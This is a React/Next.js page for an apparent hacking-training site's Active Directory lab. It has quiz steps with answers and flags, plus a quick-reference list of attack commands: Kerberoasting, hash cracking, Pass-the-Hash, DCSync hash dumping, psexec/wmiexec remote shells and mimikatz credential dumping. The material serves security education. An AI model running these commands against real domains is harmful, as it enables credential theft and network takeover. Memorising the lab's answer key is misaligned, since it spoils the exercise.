'use client'
import React, { useState, useEffect } from 'react'
import Link from 'next/link'
import LabTerminal, { LabStep } from '../../../components/LabTerminal'
import FreeLabTerminal from '../../../components/FreeLabTerminal'

const accent = '#ff4136'
const moduleId = 'active-directory'
const moduleName = 'Active Directory'
const moduleNum = '05'
const xpTotal = 145

const steps: LabStep[] = [
  {
    id: 'ad-01',
    title: 'Domain Enumeration',
    objective: 'Enumerate Active Directory users without credentials using anonymous LDAP. What tool performs AD enumeration from Linux?',
    hint: 'Starts with "enum4linux" or "ldapsearch". Both work for unauthenticated enumeration.',
    answers: ['enum4linux', 'ldapsearch', 'enum4linux-ng', 'bloodhound', 'crackmapexec'],
    xp: 20,
    explanation: 'enum4linux -a target_ip dumps users, groups, shares, and password policy via SMB/LDAP. CrackMapExec (cme smb target) does the same with more modern output. These work against misconfigured DCs that allow anonymous binds.'
  },
  {
    id: 'ad-02',
    title: 'Kerberoasting Attack',
    objective: 'Kerberoasting extracts service tickets for offline cracking. What Impacket tool requests service tickets for all SPNs?',
    hint: 'The script is part of Impacket and its name includes "GetUserSPNs".',
    answers: ['getuserspns', 'GetUserSPNs.py', 'impacket-GetUserSPNs', 'GetUserSPNs'],
    xp: 30,
    explanation: 'GetUserSPNs.py domain/user:password -request outputs TGS tickets in hashcat format (-m 13100 for Kerberos 5 TGS-REP). Any domain user can request these tickets — no elevated privileges needed. Weak service account passwords crack in seconds.'
  },
  {
    id: 'ad-03',
    title: 'Pass-the-Hash',
    objective: 'Pass-the-Hash lets you authenticate using NTLM hashes without knowing the plaintext. What tool performs PtH attacks against Windows targets?',
    hint: 'CrackMapExec, Impacket psexec, or mimikatz pth. CrackMapExec is the most versatile.',
    answers: ['crackmapexec', 'cme', 'psexec', 'mimikatz', 'impacket-psexec', 'wmiexec'],
    flag: 'FLAG{pth_attack_ready}',
    xp: 30,
    explanation: 'crackmapexec smb target -u admin -H NTLM_HASH tests PtH authentication. If local admin rights exist: crackmapexec smb target -u admin -H hash -x "whoami". NTLM hashes are dumped with mimikatz sekurlsa::logonpasswords or Impacket secretsdump.'
  },
  {
    id: 'ad-04',
    title: 'BloodHound Attack Paths',
    objective: 'BloodHound maps AD attack paths graphically. What Python-based collector gathers data for BloodHound from Linux?',
    hint: 'The Python-based collector for BloodHound is called "bloodhound-python".',
    answers: ['bloodhound-python', 'bloodhound', 'sharphound', 'python bloodhound'],
    xp: 25,
    explanation: 'bloodhound-python -u user -p pass -d domain.local -dc dc.domain.local -c All collects all AD objects. Import the JSON files into BloodHound, then query "Shortest path to Domain Admins" to visualize attack chains through group memberships and ACLs.'
  },
  {
    id: 'ad-05',
    title: 'DCSync Attack',
    objective: 'DCSync replicates password hashes directly from a Domain Controller. What Impacket script performs a DCSync attack?',
    hint: 'The script dumps secrets from a DC. It\'s called "secretsdump".',
    answers: ['secretsdump', 'secretsdump.py', 'impacket-secretsdump'],
    flag: 'FLAG{dcsync_complete}',
    xp: 40,
    explanation: 'impacket-secretsdump domain/user:password@dc_ip -just-dc-ntlm replicates the NTDS.dit hashes using the MS-DRSR replication protocol. Requires DS-Replication-Get-Changes and DS-Replication-Get-Changes-All rights — typically held by Domain Admins or delegated accounts.'
  }
]

export default function ActiveDirectoryLab() {
  const [guidedDone, setGuidedDone] = useState(false)
  const [freeLaunched, setFreeLaunched] = useState(false)
  const [earnedXp, setEarnedXp] = useState(0)
  const [showKeywords, setShowKeywords] = useState(false)

  useEffect(() => {
    const saved = localStorage.getItem('lab_active-directory-lab')
    if (saved) {
      const d = JSON.parse(saved)
      if (d.done) { setGuidedDone(true); setEarnedXp(d.xp || 0) }
    }
  }, [])

  return (
    <div>
      {/* Breadcrumb */}
      <div style={{ display: 'flex', alignItems: 'center', gap: '8px', marginBottom: '2rem', fontFamily: 'JetBrains Mono, monospace', fontSize: '0.7rem', color: '#7a1a1a' }}>
        <Link href="/" style={{ color: '#7a1a1a', textDecoration: 'none' }}>GHOSTNET</Link>
        <span>&#8250;</span>
        <Link href="/modules/active-directory" style={{ color: '#7a1a1a', textDecoration: 'none' }}>ACTIVE DIRECTORY</Link>
        <span>&#8250;</span>
        <span style={{ color: accent }}>LAB</span>
        <div style={{ marginLeft: 'auto', display: 'flex', gap: '6px', alignItems: 'center' }}>
          <Link href="/modules/active-directory" style={{ textDecoration: 'none', padding: '3px 10px', border: '1px solid #3a0a0a', borderRadius: '3px', color: '#7a1a1a', fontSize: '7.5px', letterSpacing: '0.1em' }}>&#8592; CONCEPT</Link>
          <span style={{ padding: '3px 10px', background: 'rgba(255,65,54,0.1)', border: '1px solid rgba(255,65,54,0.4)', borderRadius: '3px', color: accent, fontSize: '7.5px', letterSpacing: '0.1em', fontWeight: 700 }}>LAB ACTIVE</span>
        </div>
      </div>

      {/* Progress banner */}
      <div style={{ background: 'rgba(255,65,54,0.04)', border: '1px solid rgba(255,65,54,0.15)', borderRadius: '6px', padding: '10px 16px', marginBottom: '1.5rem', display: 'flex', alignItems: 'center', gap: '12px', flexWrap: 'wrap' }}>
        <div style={{ display: 'flex', gap: '6px' }}>
          {[{ label: 'PHASE 1', done: true, active: !guidedDone }, { label: 'PHASE 2', done: guidedDone, active: guidedDone }].map((p, i) => (
            <div key={i} style={{ display: 'flex', alignItems: 'center', gap: '5px' }}>
              <div style={{ width: '8px', height: '8px', borderRadius: '50%', background: p.done ? accent : '#3a0a0a', border: p.active ? '2px solid ' + accent : '1px solid #3a0a0a', boxShadow: p.active ? '0 0 6px ' + accent : 'none' }} />
              <span style={{ fontFamily: 'JetBrains Mono, monospace', fontSize: '7px', color: p.done ? accent : '#5a1a1a', letterSpacing: '0.1em' }}>{p.label}</span>
              {i === 0 && <span style={{ fontSize: '7px', color: '#3a0a0a', margin: '0 2px' }}>—</span>}
            </div>
          ))}
        </div>
        <div style={{ fontFamily: 'JetBrains Mono, monospace', fontSize: '7.5px', color: '#8a4a4a' }}>
          MOD-{moduleNum} &nbsp;·&nbsp; {moduleName.toUpperCase()} &nbsp;·&nbsp; {xpTotal} XP AVAILABLE
        </div>
        {guidedDone && (
          <div style={{ marginLeft: 'auto', fontFamily: 'JetBrains Mono, monospace', fontSize: '7.5px', color: accent, fontWeight: 700 }}>
            &#10003; GUIDED PHASE COMPLETE — LAUNCH FREE LAB BELOW
          </div>
        )}
      </div>

      {/* PHASE 1 */}
      <div style={{ marginBottom: '3rem' }}>
        <div style={{ display: 'flex', alignItems: 'center', gap: '12px', marginBottom: '1.25rem' }}>
          <div style={{ width: '28px', height: '28px', borderRadius: '6px', background: 'rgba(255,65,54,0.1)', border: '1px solid rgba(255,65,54,0.3)', display: 'flex', alignItems: 'center', justifyContent: 'center', flexShrink: 0 }}>
            <span style={{ fontFamily: 'JetBrains Mono, monospace', fontSize: '10px', color: accent, fontWeight: 700 }}>1</span>
          </div>
          <div>
            <div style={{ fontFamily: 'JetBrains Mono, monospace', fontSize: '0.65rem', color: '#5a1a1a', letterSpacing: '0.2em', marginBottom: '2px' }}>PHASE 1 — GUIDED LEARNING</div>
            <h1 style={{ fontFamily: 'JetBrains Mono, monospace', fontSize: '1.4rem', fontWeight: 700, color: accent, margin: 0 }}>Active Directory Lab</h1>
          </div>
        </div>

        <p style={{ color: '#8a6a6a', fontSize: '0.85rem', marginBottom: '1rem', lineHeight: 1.7, fontFamily: 'JetBrains Mono, monospace' }}>
          Domain enumeration, Kerberoasting, Pass-the-Hash, BloodHound mapping, and DCSync attacks.
          Type real commands, earn XP, and capture flags. Complete all 5 steps to unlock Phase 2.
        </p>

        <div style={{ background: 'rgba(255,65,54,0.03)', border: '1px solid rgba(255,65,54,0.12)', borderRadius: '6px', padding: '1rem 1.25rem', marginBottom: '1.25rem', fontFamily: 'JetBrains Mono, monospace' }}>
          <div style={{ fontSize: '7px', color: '#3a0a0a', letterSpacing: '0.25em', marginBottom: '8px' }}>KEY CONCEPTS COVERED IN THIS LAB</div>
          <div style={{ display: 'flex', flexWrap: 'wrap', gap: '6px' }}>
            {['LDAP enumeration', 'Kerberoasting', 'TGS ticket cracking', 'Pass-the-Hash', 'NTLM authentication', 'BloodHound graphs', 'DCSync replication', 'Impacket suite'].map(c => (
              <span key={c} style={{ fontSize: '7.5px', color: '#8a4a4a', background: 'rgba(255,65,54,0.06)', border: '1px solid rgba(255,65,54,0.12)', padding: '2px 8px', borderRadius: '3px' }}>{c}</span>
            ))}
          </div>
        </div>

        <LabTerminal
          labId="active-directory-lab"
          moduleId={moduleId}
          title="Active Directory Lab"
          accent={accent}
          steps={steps}
          onComplete={(xp) => { setGuidedDone(true); setEarnedXp(xp) }}
        />
      </div>

      {/* PHASE 2 */}
      <div id="free-lab" style={{ marginBottom: '3rem' }}>
        <div style={{ display: 'flex', alignItems: 'center', gap: '12px', marginBottom: '1.25rem' }}>
          <div style={{ width: '28px', height: '28px', borderRadius: '6px', background: guidedDone ? 'rgba(255,65,54,0.15)' : 'rgba(0,0,0,0.3)', border: '1px solid ' + (guidedDone ? 'rgba(255,65,54,0.4)' : '#3a0a0a'), display: 'flex', alignItems: 'center', justifyContent: 'center', flexShrink: 0 }}>
            <span style={{ fontFamily: 'JetBrains Mono, monospace', fontSize: '10px', color: guidedDone ? accent : '#5a1a1a', fontWeight: 700 }}>2</span>
          </div>
          <div>
            <div style={{ fontFamily: 'JetBrains Mono, monospace', fontSize: '0.65rem', color: guidedDone ? '#8a4a4a' : '#5a1a1a', letterSpacing: '0.2em', marginBottom: '2px' }}>PHASE 2 — FREE LAB ENVIRONMENT</div>
            <div style={{ fontFamily: 'JetBrains Mono, monospace', fontSize: '1.1rem', fontWeight: 700, color: guidedDone ? accent : '#5a1a1a' }}>Full Active Directory Practice Sandbox</div>
          </div>
          {guidedDone && !freeLaunched && (
            <div style={{ marginLeft: 'auto', fontFamily: 'JetBrains Mono, monospace', fontSize: '7.5px', color: '#ffb347', background: 'rgba(255,179,71,0.08)', border: '1px solid rgba(255,179,71,0.2)', padding: '3px 10px', borderRadius: '3px' }}>
              GUIDED PHASE COMPLETE
            </div>
          )}
        </div>

        {!freeLaunched ? (
          <div style={{ background: guidedDone ? 'rgba(255,65,54,0.04)' : '#080202', border: '1px solid ' + (guidedDone ? 'rgba(255,65,54,0.25)' : '#200808'), borderRadius: '10px', padding: '2.5rem', textAlign: 'center', position: 'relative', overflow: 'hidden' }}>
            {guidedDone && <div style={{ position: 'absolute', top: 0, left: 0, right: 0, height: '2px', background: 'linear-gradient(90deg, transparent, ' + accent + ', transparent)' }} />}
            <div style={{ fontSize: '7px', color: guidedDone ? '#8a4a4a' : '#3a0a0a', letterSpacing: '0.3em', marginBottom: '1rem' }}>
              {guidedDone ? 'READY FOR COMPREHENSIVE TESTING' : 'COMPLETE GUIDED PHASE TO UNLOCK'}
            </div>
            <div style={{ fontFamily: 'JetBrains Mono, monospace', fontSize: '1.2rem', color: guidedDone ? accent : '#5a1a1a', fontWeight: 700, marginBottom: '0.5rem' }}>
              LAUNCH FULL LAB ENVIRONMENT
            </div>
            <div style={{ fontFamily: 'JetBrains Mono, monospace', fontSize: '0.78rem', color: '#8a4a4a', marginBottom: '0.75rem', lineHeight: 1.7 }}>
              Free-form terminal sandbox for Active Directory
            </div>
            <div style={{ fontFamily: 'JetBrains Mono, monospace', fontSize: '0.72rem', color: '#5a1a1a', marginBottom: '2rem', lineHeight: 1.7 }}>
              Command history &nbsp;·&nbsp; Tab autocomplete &nbsp;·&nbsp; Real command simulation &nbsp;·&nbsp; No restrictions
            </div>
            <div style={{ display: 'flex', gap: '12px', justifyContent: 'center', flexWrap: 'wrap', marginBottom: '2rem' }}>
              {['enum4linux enumeration', 'Impacket tools', 'CrackMapExec', 'BloodHound analysis', 'Kerberos attacks', 'NTLM relay attacks'].map(feat => (
                <div key={feat} style={{ display: 'flex', alignItems: 'center', gap: '5px' }}>
                  <div style={{ width: '4px', height: '4px', borderRadius: '50%', background: guidedDone ? accent : '#3a0a0a' }} />
                  <span style={{ fontFamily: 'JetBrains Mono, monospace', fontSize: '7.5px', color: guidedDone ? '#8a4a4a' : '#3a0a0a' }}>{feat}</span>
                </div>
              ))}
            </div>
            <button
              onClick={() => guidedDone && setFreeLaunched(true)}
              disabled={!guidedDone}
              style={{ fontFamily: 'JetBrains Mono, monospace', fontSize: '0.9rem', fontWeight: 700, letterSpacing: '0.15em', padding: '14px 40px', border: '1px solid ' + (guidedDone ? 'rgba(255,65,54,0.6)' : '#3a0a0a'), borderRadius: '6px', background: guidedDone ? 'rgba(255,65,54,0.12)' : 'transparent', color: guidedDone ? accent : '#3a0a0a', cursor: guidedDone ? 'pointer' : 'not-allowed', boxShadow: guidedDone ? '0 0 24px rgba(255,65,54,0.18)' : 'none', transition: 'all 0.2s' }}
            >
              {guidedDone ? '&#9658; LAUNCH FREE LAB ENVIRONMENT' : '&#128274; COMPLETE GUIDED PHASE FIRST'}
            </button>
            {!guidedDone && <div style={{ marginTop: '1rem', fontFamily: 'JetBrains Mono, monospace', fontSize: '7px', color: '#3a0a0a' }}>Complete all 5 guided steps above to unlock the free lab environment</div>}
          </div>
        ) : (
          <div style={{ border: '1px solid ' + accent + '30', borderRadius: '10px', overflow: 'hidden', background: '#080202' }}>
            <FreeLabTerminal moduleId={moduleId} moduleName={moduleName} accent={accent} onClose={() => setFreeLaunched(false)} />
            <div style={{ padding: '8px 16px', background: '#0a0303', borderTop: '1px solid ' + accent + '15', display: 'flex', alignItems: 'center', gap: '8px' }}>
              <div style={{ width: '5px', height: '5px', borderRadius: '50%', background: accent, boxShadow: '0 0 5px ' + accent }} />
              <span style={{ fontFamily: 'JetBrains Mono, monospace', fontSize: '7.5px', color: '#5a1a1a' }}>
                You are in free practice mode. Ask <span style={{ color: accent }}>GHOST AGENT</span> (bottom-right) for hints on any Active Directory technique.
              </span>
            </div>
          </div>
        )}
      </div>

      {/* Quick reference */}
      <div style={{ marginBottom: '2rem' }}>
        <button onClick={() => setShowKeywords(!showKeywords)} style={{ background: 'transparent', border: '1px solid #3a0a0a', borderRadius: '5px', padding: '8px 16px', cursor: 'pointer', fontFamily: 'JetBrains Mono, monospace', fontSize: '7.5px', color: '#5a1a1a', letterSpacing: '0.1em', marginBottom: showKeywords ? '12px' : 0 }}>
          {showKeywords ? '▼' : '▶'} QUICK REFERENCE — AD ATTACK COMMANDS
        </button>
        {showKeywords && (
          <div style={{ background: '#080202', border: '1px solid #200808', borderRadius: '6px', padding: '1.25rem', fontFamily: 'JetBrains Mono, monospace', fontSize: '0.75rem' }}>
            <div style={{ display: 'grid', gridTemplateColumns: 'repeat(auto-fill, minmax(320px, 1fr))', gap: '8px' }}>
              {[
                ['enum4linux -a target_ip', 'Full AD enumeration via SMB/LDAP'],
                ['crackmapexec smb target -u "" -p ""', 'Anonymous SMB enumeration'],
                ['GetUserSPNs.py domain/user:pass -request', 'Kerberoast — extract TGS tickets'],
                ['hashcat -m 13100 tgs.txt rockyou.txt', 'Crack Kerberos TGS-REP hashes'],
                ['crackmapexec smb target -u admin -H HASH', 'Pass-the-Hash authentication'],
                ['bloodhound-python -u user -p pass -d domain.local -c All', 'Collect BloodHound data'],
                ['impacket-secretsdump domain/user:pass@dc_ip -just-dc-ntlm', 'DCSync — dump NTDS hashes'],
                ['impacket-psexec domain/user:pass@target', 'Remote shell via SMB'],
                ['impacket-wmiexec domain/user:pass@target', 'Remote shell via WMI'],
                ['mimikatz sekurlsa::logonpasswords', 'Dump credentials from memory'],
                ['ldapsearch -x -h dc_ip -b "dc=domain,dc=local"', 'Raw LDAP enumeration'],
                ['kerbrute userenum users.txt -d domain.local', 'Enumerate valid AD users'],
              ].map(([cmd, desc]) => (
                <div key={cmd} style={{ display: 'flex', gap: '10px', alignItems: 'flex-start', padding: '6px 8px', background: '#060101', borderRadius: '4px' }}>
                  <code style={{ color: accent, fontSize: '0.72rem', flexShrink: 0 }}>{cmd}</code>
                  <span style={{ color: '#8a4a4a', fontSize: '0.7rem' }}>{desc}</span>
                </div>
              ))}
            </div>
          </div>
        )}
      </div>

      {/* Footer nav */}
      <div style={{ paddingTop: '2rem', borderTop: '1px solid #200808', display: 'flex', justifyContent: 'space-between', alignItems: 'center', flexWrap: 'wrap', gap: '10px' }}>
        <Link href="/modules/active-directory" style={{ textDecoration: 'none', fontFamily: 'JetBrains Mono, monospace', fontSize: '0.75rem', color: '#5a1a1a' }}>&#8592; BACK TO CONCEPT</Link>
        <Link href="/modules/web-attacks/lab" style={{ textDecoration: 'none', fontFamily: 'JetBrains Mono, monospace', fontSize: '0.75rem', color: '#5a1a1a' }}>MOD-06 WEB ATTACKS LAB &#8594;</Link>
      </div>
    </div>
  )
}
